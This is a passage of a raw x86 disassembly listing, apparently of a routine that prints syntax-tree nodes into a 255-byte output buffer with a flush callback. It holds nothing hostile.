  404424:	39 c8                	cmp    %ecx,%eax
  404426:	0f 84 08 08 00 00    	je     0x404c34
  40442c:	8b 12                	mov    (%edx),%edx
  40442e:	85 d2                	test   %edx,%edx
  404430:	75 de                	jne    0x404410
  404432:	31 f6                	xor    %esi,%esi
  404434:	e9 5c ff ff ff       	jmp    0x404395
  404439:	8b 49 04             	mov    0x4(%ecx),%ecx
  40443c:	8b 54 24 18          	mov    0x18(%esp),%edx
  404440:	89 d8                	mov    %ebx,%eax
  404442:	e8 c9 ea ff ff       	call   0x402f10
  404447:	e9 b4 eb ff ff       	jmp    0x403000
  40444c:	c7 83 18 01 00 00 01 	movl   $0x1,0x118(%ebx)
  404453:	00 00 00 
  404456:	e9 a5 eb ff ff       	jmp    0x403000
  40445b:	83 7e 08 01          	cmpl   $0x1,0x8(%esi)
  40445f:	0f 85 09 f3 ff ff    	jne    0x40376e
  404465:	8b 4e 04             	mov    0x4(%esi),%ecx
  404468:	80 39 3e             	cmpb   $0x3e,(%ecx)
  40446b:	0f 85 fd f2 ff ff    	jne    0x40376e
  404471:	89 d8                	mov    %ebx,%eax
  404473:	ba 28 00 00 00       	mov    $0x28,%edx
  404478:	e8 83 e4 ff ff       	call   0x402900
  40447d:	8b 45 04             	mov    0x4(%ebp),%eax
  404480:	8b 40 04             	mov    0x4(%eax),%eax
  404483:	8b 30                	mov    (%eax),%esi
  404485:	8b 45 08             	mov    0x8(%ebp),%eax
  404488:	e9 e3 f2 ff ff       	jmp    0x403770
  40448d:	8d 76 00             	lea    0x0(%esi),%esi
  404490:	83 c6 01             	add    $0x1,%esi
  404493:	3b 74 24 20          	cmp    0x20(%esp),%esi
  404497:	0f 85 15 ed ff ff    	jne    0x4031b2
  40449d:	e9 5e eb ff ff       	jmp    0x403000
  4044a2:	3d ff 00 00 00       	cmp    $0xff,%eax
  4044a7:	0f 84 f7 0c 00 00    	je     0x4051a4
  4044ad:	8d 50 01             	lea    0x1(%eax),%edx
  4044b0:	89 93 00 01 00 00    	mov    %edx,0x100(%ebx)
  4044b6:	c6 04 03 2e          	movb   $0x2e,(%ebx,%eax,1)
  4044ba:	c6 83 04 01 00 00 2e 	movb   $0x2e,0x104(%ebx)
  4044c1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4044c4:	83 39 45             	cmpl   $0x45,(%ecx)
  4044c7:	0f 84 ff 08 00 00    	je     0x404dcc
  4044cd:	8b 54 24 18          	mov    0x18(%esp),%edx
  4044d1:	89 d8                	mov    %ebx,%eax
  4044d3:	e8 38 ea ff ff       	call   0x402f10
  4044d8:	e9 23 eb ff ff       	jmp    0x403000
  4044dd:	8b 54 24 18          	mov    0x18(%esp),%edx
  4044e1:	8d 4d 04             	lea    0x4(%ebp),%ecx
  4044e4:	89 d8                	mov    %ebx,%eax
  4044e6:	e8 f5 21 00 00       	call   0x4066e0
  4044eb:	e9 10 eb ff ff       	jmp    0x403000
  4044f0:	8b 4d 04             	mov    0x4(%ebp),%ecx
  4044f3:	8b 54 24 18          	mov    0x18(%esp),%edx
  4044f7:	89 d8                	mov    %ebx,%eax
  4044f9:	e8 12 ea ff ff       	call   0x402f10
  4044fe:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  404504:	3d ff 00 00 00       	cmp    $0xff,%eax
  404509:	0f 84 68 09 00 00    	je     0x404e77
  40450f:	8d 50 01             	lea    0x1(%eax),%edx
  404512:	89 93 00 01 00 00    	mov    %edx,0x100(%ebx)
  404518:	c6 04 03 29          	movb   $0x29,(%ebx,%eax,1)
  40451c:	c6 83 04 01 00 00 29 	movb   $0x29,0x104(%ebx)
  404523:	e9 d8 ea ff ff       	jmp    0x403000
  404528:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40452b:	8b 54 24 18          	mov    0x18(%esp),%edx
  40452f:	89 d8                	mov    %ebx,%eax
  404531:	e8 da e9 ff ff       	call   0x402f10
  404536:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  40453c:	3d ff 00 00 00       	cmp    $0xff,%eax
  404541:	0f 84 fb 08 00 00    	je     0x404e42
  404547:	8d 50 01             	lea    0x1(%eax),%edx
  40454a:	89 93 00 01 00 00    	mov    %edx,0x100(%ebx)
  404550:	c6 04 03 5d          	movb   $0x5d,(%ebx,%eax,1)
  404554:	c6 83 04 01 00 00 5d 	movb   $0x5d,0x104(%ebx)
  40455b:	e9 a0 ea ff ff       	jmp    0x403000
  404560:	8b 4d 04             	mov    0x4(%ebp),%ecx
  404563:	8b 54 24 18          	mov    0x18(%esp),%edx
  404567:	89 d8                	mov    %ebx,%eax
  404569:	e8 a2 e9 ff ff       	call   0x402f10
  40456e:	e9 8d ea ff ff       	jmp    0x403000
  404573:	8b 4d 04             	mov    0x4(%ebp),%ecx
  404576:	8b 54 24 18          	mov    0x18(%esp),%edx
  40457a:	89 d8                	mov    %ebx,%eax
  40457c:	e8 8f e9 ff ff       	call   0x402f10
  404581:	e9 7a ea ff ff       	jmp    0x403000
  404586:	8b 4d 04             	mov    0x4(%ebp),%ecx
  404589:	8b 54 24 18          	mov    0x18(%esp),%edx
  40458d:	89 d8                	mov    %ebx,%eax
  40458f:	e8 7c e9 ff ff       	call   0x402f10
  404594:	ba 7a 7c 42 00       	mov    $0x427c7a,%edx
  404599:	89 d8                	mov    %ebx,%eax
  40459b:	e8 20 e8 ff ff       	call   0x402dc0
  4045a0:	8b 55 08             	mov    0x8(%ebp),%edx
  4045a3:	89 d8                	mov    %ebx,%eax
  4045a5:	83 c2 01             	add    $0x1,%edx
  4045a8:	e8 a3 e8 ff ff       	call   0x402e50
  4045ad:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  4045b3:	3d ff 00 00 00       	cmp    $0xff,%eax
  4045b8:	0f 84 d9 07 00 00    	je     0x404d97
  4045be:	8d 50 01             	lea    0x1(%eax),%edx
  4045c1:	89 93 00 01 00 00    	mov    %edx,0x100(%ebx)
  4045c7:	c6 04 03 7d          	movb   $0x7d,(%ebx,%eax,1)
  4045cb:	c6 83 04 01 00 00 7d 	movb   $0x7d,0x104(%ebx)
  4045d2:	e9 29 ea ff ff       	jmp    0x403000
  4045d7:	8b 75 04             	mov    0x4(%ebp),%esi
  4045da:	0f b6 0e             	movzbl (%esi),%ecx
  4045dd:	8d 51 9f             	lea    -0x61(%ecx),%edx
  4045e0:	80 fa 19             	cmp    $0x19,%dl
  4045e3:	0f 86 19 03 00 00    	jbe    0x404902
  4045e9:	31 c0                	xor    %eax,%eax
  4045eb:	80 7c 3e ff 20       	cmpb   $0x20,-0x1(%esi,%edi,1)
  4045f0:	0f 94 c0             	sete   %al
  4045f3:	29 c7                	sub    %eax,%edi
  4045f5:	0f 84 05 ea ff ff    	je     0x403000
  4045fb:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  404601:	01 f7                	add    %esi,%edi
  404603:	eb 1f                	jmp    0x404624
  404605:	89 c1                	mov    %eax,%ecx
  404607:	83 c0 01             	add    $0x1,%eax
  40460a:	83 c6 01             	add    $0x1,%esi
  40460d:	89 83 00 01 00 00    	mov    %eax,0x100(%ebx)
  404613:	88 14 0b             	mov    %dl,(%ebx,%ecx,1)
  404616:	39 fe                	cmp    %edi,%esi
  404618:	88 93 04 01 00 00    	mov    %dl,0x104(%ebx)
  40461e:	0f 84 dc e9 ff ff    	je     0x403000
  404624:	3d ff 00 00 00       	cmp    $0xff,%eax
  404629:	0f b6 16             	movzbl (%esi),%edx
  40462c:	75 d7                	jne    0x404605
  40462e:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  404634:	88 54 24 18          	mov    %dl,0x18(%esp)
  404638:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  40463f:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  404646:	00 
  404647:	89 1c 24             	mov    %ebx,(%esp)
  40464a:	89 44 24 08          	mov    %eax,0x8(%esp)
  40464e:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  404654:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  40465b:	b8 01 00 00 00       	mov    $0x1,%eax
  404660:	31 c9                	xor    %ecx,%ecx
  404662:	0f b6 54 24 18       	movzbl 0x18(%esp),%edx
  404667:	eb a1                	jmp    0x40460a
  404669:	8b 4d 04             	mov    0x4(%ebp),%ecx
  40466c:	8b 54 24 18          	mov    0x18(%esp),%edx
  404670:	89 d8                	mov    %ebx,%eax
  404672:	e8 99 e8 ff ff       	call   0x402f10
  404677:	e9 84 e9 ff ff       	jmp    0x403000
  40467c:	8b 4d 04             	mov    0x4(%ebp),%ecx
  40467f:	8b 54 24 18          	mov    0x18(%esp),%edx
  404683:	89 d8                	mov    %ebx,%eax
  404685:	e8 86 e8 ff ff       	call   0x402f10
  40468a:	e9 71 e9 ff ff       	jmp    0x403000
  40468f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404692:	8b 54 24 18          	mov    0x18(%esp),%edx
  404696:	89 d8                	mov    %ebx,%eax
  404698:	e8 73 e8 ff ff       	call   0x402f10
  40469d:	e9 5e e9 ff ff       	jmp    0x403000
  4046a2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4046a5:	8b 54 24 18          	mov    0x18(%esp),%edx
  4046a9:	89 d8                	mov    %ebx,%eax
  4046ab:	8b bb 20 01 00 00    	mov    0x120(%ebx),%edi
  4046b1:	e8 5a e8 ff ff       	call   0x402f10
  4046b6:	39 bb 20 01 00 00    	cmp    %edi,0x120(%ebx)
  4046bc:	0f 85 3e e9 ff ff    	jne    0x403000
  4046c2:	39 b3 00 01 00 00    	cmp    %esi,0x100(%ebx)
  4046c8:	0f 85 32 e9 ff ff    	jne    0x403000
  4046ce:	8d 46 fe             	lea    -0x2(%esi),%eax
  4046d1:	89 83 00 01 00 00    	mov    %eax,0x100(%ebx)
  4046d7:	e9 24 e9 ff ff       	jmp    0x403000
  4046dc:	8b 54 24 18          	mov    0x18(%esp),%edx
  4046e0:	89 e9                	mov    %ebp,%ecx
  4046e2:	89 d8                	mov    %ebx,%eax
  4046e4:	e8 77 0f 00 00       	call   0x405660
  4046e9:	e9 e5 fc ff ff       	jmp    0x4043d3
  4046ee:	8b 7d 04             	mov    0x4(%ebp),%edi
  4046f1:	85 d2                	test   %edx,%edx
  4046f3:	89 54 24 20          	mov    %edx,0x20(%esp)
  4046f7:	89 7c 24 24          	mov    %edi,0x24(%esp)
  4046fb:	0f 85 a8 ea ff ff    	jne    0x4031a9
  404701:	e9 fa e8 ff ff       	jmp    0x403000
  404706:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  40470c:	be 2f 7c 42 00       	mov    $0x427c2f,%esi
  404711:	eb 1f                	jmp    0x404732
  404713:	89 c1                	mov    %eax,%ecx
  404715:	83 c0 01             	add    $0x1,%eax
  404718:	83 c6 01             	add    $0x1,%esi
  40471b:	89 83 00 01 00 00    	mov    %eax,0x100(%ebx)
  404721:	88 14 0b             	mov    %dl,(%ebx,%ecx,1)
  404724:	81 fe 35 7c 42 00    	cmp    $0x427c35,%esi
  40472a:	88 93 04 01 00 00    	mov    %dl,0x104(%ebx)
  404730:	74 45                	je     0x404777
  404732:	3d ff 00 00 00       	cmp    $0xff,%eax
  404737:	0f b6 16             	movzbl (%esi),%edx
  40473a:	75 d7                	jne    0x404713
  40473c:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  404742:	88 54 24 18          	mov    %dl,0x18(%esp)
  404746:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  40474d:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  404754:	00 
  404755:	89 1c 24             	mov    %ebx,(%esp)
  404758:	89 44 24 08          	mov    %eax,0x8(%esp)
  40475c:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  404762:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  404769:	b8 01 00 00 00       	mov    $0x1,%eax
  40476e:	31 c9                	xor    %ecx,%ecx
  404770:	0f b6 54 24 18       	movzbl 0x18(%esp),%edx
  404775:	eb a1                	jmp    0x404718
  404777:	8d 44 24 40          	lea    0x40(%esp),%eax
  40477b:	89 7c 24 08          	mov    %edi,0x8(%esp)
  40477f:	c7 44 24 04 2c 7a 42 	movl   $0x427a2c,0x4(%esp)
  404786:	00 
  404787:	89 04 24             	mov    %eax,(%esp)
  40478a:	89 c7                	mov    %eax,%edi
  40478c:	89 44 24 20          	mov    %eax,0x20(%esp)
  404790:	e8 43 b7 00 00       	call   0x40fed8
  404795:	8b 17                	mov    (%edi),%edx
  404797:	83 c7 04             	add    $0x4,%edi
  40479a:	8d 82 ff fe fe fe    	lea    -0x1010101(%edx),%eax
  4047a0:	f7 d2                	not    %edx
  4047a2:	21 d0                	and    %edx,%eax
  4047a4:	25 80 80 80 80       	and    $0x80808080,%eax
  4047a9:	74 ea                	je     0x404795
  4047ab:	89 c2                	mov    %eax,%edx
  4047ad:	c1 ea 10             	shr    $0x10,%edx
  4047b0:	a9 80 80 00 00       	test   $0x8080,%eax
  4047b5:	0f 44 c2             	cmove  %edx,%eax
  4047b8:	8d 57 02             	lea    0x2(%edi),%edx
  4047bb:	0f 44 fa             	cmove  %edx,%edi
  4047be:	00 c0                	add    %al,%al
  4047c0:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  4047c6:	83 df 03             	sbb    $0x3,%edi
  4047c9:	2b 7c 24 20          	sub    0x20(%esp),%edi
  4047cd:	74 73                	je     0x404842
  4047cf:	31 f6                	xor    %esi,%esi
  4047d1:	8b 6c 24 20          	mov    0x20(%esp),%ebp
  4047d5:	eb 24                	jmp    0x4047fb
  4047d7:	89 f6                	mov    %esi,%esi
  4047d9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4047e0:	89 c1                	mov    %eax,%ecx
  4047e2:	83 c0 01             	add    $0x1,%eax
  4047e5:	83 c6 01             	add    $0x1,%esi
  4047e8:	89 83 00 01 00 00    	mov    %eax,0x100(%ebx)
  4047ee:	88 14 0b             	mov    %dl,(%ebx,%ecx,1)
  4047f1:	39 fe                	cmp    %edi,%esi
  4047f3:	88 93 04 01 00 00    	mov    %dl,0x104(%ebx)
  4047f9:	74 47                	je     0x404842
  4047fb:	3d ff 00 00 00       	cmp    $0xff,%eax
  404800:	0f b6 54 35 00       	movzbl 0x0(%ebp,%esi,1),%edx
  404805:	75 d9                	jne    0x4047e0
  404807:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  40480d:	88 54 24 18          	mov    %dl,0x18(%esp)
  404811:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  404818:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  40481f:	00 
  404820:	89 1c 24             	mov    %ebx,(%esp)
  404823:	89 44 24 08          	mov    %eax,0x8(%esp)
  404827:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  40482d:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  404834:	b8 01 00 00 00       	mov    $0x1,%eax
  404839:	31 c9                	xor    %ecx,%ecx
  40483b:	0f b6 54 24 18       	movzbl 0x18(%esp),%edx
  404840:	eb a3                	jmp    0x4047e5
  404842:	3d ff 00 00 00       	cmp    $0xff,%eax
  404847:	0f 84 22 09 00 00    	je     0x40516f
  40484d:	8d 50 01             	lea    0x1(%eax),%edx
  404850:	89 93 00 01 00 00    	mov    %edx,0x100(%ebx)
  404856:	c6 04 03 7d          	movb   $0x7d,(%ebx,%eax,1)
  40485a:	c6 83 04 01 00 00 7d 	movb   $0x7d,0x104(%ebx)
  404861:	e9 9a e7 ff ff       	jmp    0x403000
  404866:	8b 78 0c             	mov    0xc(%eax),%edi
  404869:	8b 70 08             	mov    0x8(%eax),%esi
  40486c:	85 ff                	test   %edi,%edi
  40486e:	0f 84 8c e7 ff ff    	je     0x403000
  404874:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  40487a:	01 f7                	add    %esi,%edi
  40487c:	eb 21                	jmp    0x40489f
  40487e:	66 90                	xchg   %ax,%ax
  404880:	89 c1                	mov    %eax,%ecx
  404882:	83 c0 01             	add    $0x1,%eax
  404885:	83 c6 01             	add    $0x1,%esi
  404888:	89 83 00 01 00 00    	mov    %eax,0x100(%ebx)
  40488e:	88 14 0b             	mov    %dl,(%ebx,%ecx,1)
  404891:	39 fe                	cmp    %edi,%esi
  404893:	88 93 04 01 00 00    	mov    %dl,0x104(%ebx)
  404899:	0f 84 61 e7 ff ff    	je     0x403000
  40489f:	3d ff 00 00 00       	cmp    $0xff,%eax
  4048a4:	0f b6 16             	movzbl (%esi),%edx
  4048a7:	75 d7                	jne    0x404880
  4048a9:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  4048af:	88 54 24 18          	mov    %dl,0x18(%esp)
  4048b3:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  4048ba:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  4048c1:	00 
  4048c2:	89 1c 24             	mov    %ebx,(%esp)
  4048c5:	89 44 24 08          	mov    %eax,0x8(%esp)
  4048c9:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  4048cf:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  4048d6:	b8 01 00 00 00       	mov    $0x1,%eax
  4048db:	31 c9                	xor    %ecx,%ecx
  4048dd:	0f b6 54 24 18       	movzbl 0x18(%esp),%edx
  4048e2:	eb a1                	jmp    0x404885
  4048e4:	ba bf 7b 42 00       	mov    $0x427bbf,%edx
  4048e9:	89 d8                	mov    %ebx,%eax
  4048eb:	e8 d0 e4 ff ff       	call   0x402dc0
  4048f0:	e9 0b e7 ff ff       	jmp    0x403000
  4048f5:	8b bb 14 01 00 00    	mov    0x114(%ebx),%edi
  4048fb:	89 c5                	mov    %eax,%ebp
  4048fd:	e9 93 fa ff ff       	jmp    0x404395
  404902:	3d ff 00 00 00       	cmp    $0xff,%eax
  404907:	0f 84 16 0b 00 00    	je     0x405423
  40490d:	8d 50 01             	lea    0x1(%eax),%edx
  404910:	89 93 00 01 00 00    	mov    %edx,0x100(%ebx)
  404916:	c6 04 03 20          	movb   $0x20,(%ebx,%eax,1)
  40491a:	c6 83 04 01 00 00 20 	movb   $0x20,0x104(%ebx)
  404921:	8b 75 04             	mov    0x4(%ebp),%esi
  404924:	e9 c0 fc ff ff       	jmp    0x4045e9
  404929:	8b 74 24 18          	mov    0x18(%esp),%esi
  40492d:	8b 83 14 01 00 00    	mov    0x114(%ebx),%eax
  404933:	8d 49 08             	lea    0x8(%ecx),%ecx
  404936:	83 e6 9f             	and    $0xffffff9f,%esi
  404939:	89 04 24             	mov    %eax,(%esp)
  40493c:	89 d8                	mov    %ebx,%eax
  40493e:	89 f2                	mov    %esi,%edx
  404940:	e8 7b 1a 00 00       	call   0x4063c0
  404945:	8b 4d 04             	mov    0x4(%ebp),%ecx
  404948:	85 c9                	test   %ecx,%ecx
  40494a:	0f 84 b0 e6 ff ff    	je     0x403000
  404950:	89 f2                	mov    %esi,%edx
  404952:	89 d8                	mov    %ebx,%eax
  404954:	e8 b7 e5 ff ff       	call   0x402f10
  404959:	e9 a2 e6 ff ff       	jmp    0x403000
  40495e:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  404964:	be b2 7b 42 00       	mov    $0x427bb2,%esi
  404969:	eb 28                	jmp    0x404993
  40496b:	90                   	nop
  40496c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  404970:	89 c1                	mov    %eax,%ecx
  404972:	83 c0 01             	add    $0x1,%eax
  404975:	83 c6 01             	add    $0x1,%esi
  404978:	89 83 00 01 00 00    	mov    %eax,0x100(%ebx)
  40497e:	88 14 0b             	mov    %dl,(%ebx,%ecx,1)
  404981:	81 fe b7 7b 42 00    	cmp    $0x427bb7,%esi
  404987:	88 93 04 01 00 00    	mov    %dl,0x104(%ebx)
  40498d:	0f 84 21 f1 ff ff    	je     0x403ab4
  404993:	3d ff 00 00 00       	cmp    $0xff,%eax
  404998:	0f b6 16             	movzbl (%esi),%edx
  40499b:	75 d3                	jne    0x404970
  40499d:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  4049a3:	88 54 24 1c          	mov    %dl,0x1c(%esp)
  4049a7:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  4049ae:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  4049b5:	00 
  4049b6:	89 1c 24             	mov    %ebx,(%esp)
  4049b9:	89 44 24 08          	mov    %eax,0x8(%esp)
  4049bd:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  4049c3:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  4049ca:	b8 01 00 00 00       	mov    $0x1,%eax
  4049cf:	31 c9                	xor    %ecx,%ecx
  4049d1:	0f b6 54 24 1c       	movzbl 0x1c(%esp),%edx
  4049d6:	eb 9d                	jmp    0x404975
  4049d8:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4049dc:	bf dc 7b 42 00       	mov    $0x427bdc,%edi
  4049e1:	b9 03 00 00 00       	mov    $0x3,%ecx
  4049e6:	8b 40 04             	mov    0x4(%eax),%eax
  4049e9:	8b 30                	mov    (%eax),%esi
  4049eb:	8b 45 00             	mov    0x0(%ebp),%eax
  4049ee:	89 74 24 20          	mov    %esi,0x20(%esp)
  4049f2:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  4049f4:	75 09                	jne    0x4049ff
  4049f6:	83 f8 03             	cmp    $0x3,%eax
  4049f9:	0f 84 14 0b 00 00    	je     0x405513
  4049ff:	83 f8 37             	cmp    $0x37,%eax
  404a02:	0f 84 57 0b 00 00    	je     0x40555f
  404a08:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  404a0c:	8b 54 24 18          	mov    0x18(%esp),%edx
  404a10:	89 d8                	mov    %ebx,%eax
  404a12:	bf df 7b 42 00       	mov    $0x427bdf,%edi
  404a17:	e8 e4 1e 00 00       	call   0x406900
  404a1c:	8b 74 24 20          	mov    0x20(%esp),%esi
  404a20:	b9 03 00 00 00       	mov    $0x3,%ecx
  404a25:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  404a27:	0f 84 4b 05 00 00    	je     0x404f78
  404a2d:	8b 74 24 20          	mov    0x20(%esp),%esi
  404a31:	bf e2 7b 42 00       	mov    $0x427be2,%edi
  404a36:	b9 03 00 00 00       	mov    $0x3,%ecx
  404a3b:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  404a3d:	0f 85 0a ee ff ff    	jne    0x40384d
  404a43:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  404a49:	3d ff 00 00 00       	cmp    $0xff,%eax
  404a4e:	0f 84 8f 0a 00 00    	je     0x4054e3
  404a54:	8d 50 01             	lea    0x1(%eax),%edx
  404a57:	89 e9                	mov    %ebp,%ecx
  404a59:	89 93 00 01 00 00    	mov    %edx,0x100(%ebx)
  404a5f:	8b 54 24 18          	mov    0x18(%esp),%edx
  404a63:	c6 04 03 28          	movb   $0x28,(%ebx,%eax,1)
  404a67:	89 d8                	mov    %ebx,%eax
  404a69:	c6 83 04 01 00 00 28 	movb   $0x28,0x104(%ebx)
  404a70:	e8 9b e4 ff ff       	call   0x402f10
  404a75:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  404a7b:	3d ff 00 00 00       	cmp    $0xff,%eax
  404a80:	0f 84 2d 0a 00 00    	je     0x4054b3
  404a86:	8d 50 01             	lea    0x1(%eax),%edx
  404a89:	89 93 00 01 00 00    	mov    %edx,0x100(%ebx)
  404a8f:	c6 04 03 29          	movb   $0x29,(%ebx,%eax,1)
  404a93:	c6 83 04 01 00 00 29 	movb   $0x29,0x104(%ebx)
  404a9a:	e9 61 e5 ff ff       	jmp    0x403000
  404a9f:	8b b3 28 01 00 00    	mov    0x128(%ebx),%esi
  404aa5:	8b bb 24 01 00 00    	mov    0x124(%ebx),%edi
  404aab:	85 f6                	test   %esi,%esi
  404aad:	89 7c 24 20          	mov    %edi,0x20(%esp)
  404ab1:	7e 32                	jle    0x404ae5
  404ab3:	3b 07                	cmp    (%edi),%eax
  404ab5:	0f 84 50 e5 ff ff    	je     0x40300b
  404abb:	8b 7c 24 20          	mov    0x20(%esp),%edi
  404abf:	31 c9                	xor    %ecx,%ecx
  404ac1:	8d 57 08             	lea    0x8(%edi),%edx
  404ac4:	eb 18                	jmp    0x404ade
  404ac6:	8d 76 00             	lea    0x0(%esi),%esi
  404ac9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  404ad0:	89 d7                	mov    %edx,%edi
  404ad2:	83 c2 08             	add    $0x8,%edx
  404ad5:	3b 42 f8             	cmp    -0x8(%edx),%eax
  404ad8:	0f 84 31 e5 ff ff    	je     0x40300f
  404ade:	83 c1 01             	add    $0x1,%ecx
  404ae1:	39 f1                	cmp    %esi,%ecx
  404ae3:	75 eb                	jne    0x404ad0
  404ae5:	3b b3 2c 01 00 00    	cmp    0x12c(%ebx),%esi
  404aeb:	0f 8d 9e 0a 00 00    	jge    0x40558f
  404af1:	8b 7c 24 20          	mov    0x20(%esp),%edi
  404af5:	8d 14 f7             	lea    (%edi,%esi,8),%edx
  404af8:	8b bb 10 01 00 00    	mov    0x110(%ebx),%edi
  404afe:	83 c6 01             	add    $0x1,%esi
  404b01:	89 b3 28 01 00 00    	mov    %esi,0x128(%ebx)
  404b07:	83 c2 04             	add    $0x4,%edx
  404b0a:	89 42 fc             	mov    %eax,-0x4(%edx)
  404b0d:	85 ff                	test   %edi,%edi
  404b0f:	89 7c 24 24          	mov    %edi,0x24(%esp)
  404b13:	74 63                	je     0x404b78
  404b15:	8b bb 34 01 00 00    	mov    0x134(%ebx),%edi
  404b1b:	8b b3 38 01 00 00    	mov    0x138(%ebx),%esi
  404b21:	8d 0c fd 00 00 00 00 	lea    0x0(,%edi,8),%ecx
  404b28:	39 f7                	cmp    %esi,%edi
  404b2a:	89 74 24 28          	mov    %esi,0x28(%esp)
  404b2e:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  404b32:	0f 8d 57 0a 00 00    	jge    0x40558f
  404b38:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  404b3c:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  404b40:	eb 0f                	jmp    0x404b51
  404b42:	83 44 24 20 08       	addl   $0x8,0x20(%esp)
  404b47:	3b 7c 24 28          	cmp    0x28(%esp),%edi
  404b4b:	0f 84 38 0a 00 00    	je     0x405589
  404b51:	8b 74 24 20          	mov    0x20(%esp),%esi
  404b55:	03 b3 30 01 00 00    	add    0x130(%ebx),%esi
  404b5b:	83 c7 01             	add    $0x1,%edi
  404b5e:	8b 41 04             	mov    0x4(%ecx),%eax
  404b61:	89 46 04             	mov    %eax,0x4(%esi)
  404b64:	89 32                	mov    %esi,(%edx)
  404b66:	89 f2                	mov    %esi,%edx
  404b68:	8b 09                	mov    (%ecx),%ecx
  404b6a:	85 c9                	test   %ecx,%ecx
  404b6c:	75 d4                	jne    0x404b42
  404b6e:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  404b72:	89 bb 34 01 00 00    	mov    %edi,0x134(%ebx)
  404b78:	c7 02 00 00 00 00    	movl   $0x0,(%edx)
  404b7e:	8d 50 04             	lea    0x4(%eax),%edx
  404b81:	89 d8                	mov    %ebx,%eax
  404b83:	31 f6                	xor    %esi,%esi
  404b85:	e8 a6 e0 ff ff       	call   0x402c30
  404b8a:	85 c0                	test   %eax,%eax
  404b8c:	0f 85 a3 e4 ff ff    	jne    0x403035
  404b92:	e9 e9 e4 ff ff       	jmp    0x403080
  404b97:	89 f6                	mov    %esi,%esi
  404b99:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  404ba0:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  404ba6:	3d ff 00 00 00       	cmp    $0xff,%eax
  404bab:	0f 84 d2 08 00 00    	je     0x405483
  404bb1:	8d 50 01             	lea    0x1(%eax),%edx
  404bb4:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  404bb8:	89 93 00 01 00 00    	mov    %edx,0x100(%ebx)
  404bbe:	8b 54 24 18          	mov    0x18(%esp),%edx
  404bc2:	c6 04 03 28          	movb   $0x28,(%ebx,%eax,1)
  404bc6:	83 c1 04             	add    $0x4,%ecx
  404bc9:	89 d8                	mov    %ebx,%eax
  404bcb:	c6 83 04 01 00 00 28 	movb   $0x28,0x104(%ebx)
  404bd2:	e8 09 1b 00 00       	call   0x4066e0
  404bd7:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  404bdd:	3d ff 00 00 00       	cmp    $0xff,%eax
  404be2:	0f 84 6b 08 00 00    	je     0x405453
  404be8:	8d 50 01             	lea    0x1(%eax),%edx
  404beb:	89 93 00 01 00 00    	mov    %edx,0x100(%ebx)
  404bf1:	c6 04 03 29          	movb   $0x29,(%ebx,%eax,1)
  404bf5:	c6 83 04 01 00 00 29 	movb   $0x29,0x104(%ebx)
  404bfc:	e9 4c ec ff ff       	jmp    0x40384d
  404c01:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  404c07:	c6 04 33 00          	movb   $0x0,(%ebx,%esi,1)
  404c0b:	89 74 24 04          	mov    %esi,0x4(%esp)
  404c0f:	89 1c 24             	mov    %ebx,(%esp)
  404c12:	31 f6                	xor    %esi,%esi
  404c14:	89 44 24 08          	mov    %eax,0x8(%esp)
  404c18:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  404c1e:	c7 83 00 01 00 00 00 	movl   $0x0,0x100(%ebx)
  404c25:	00 00 00 
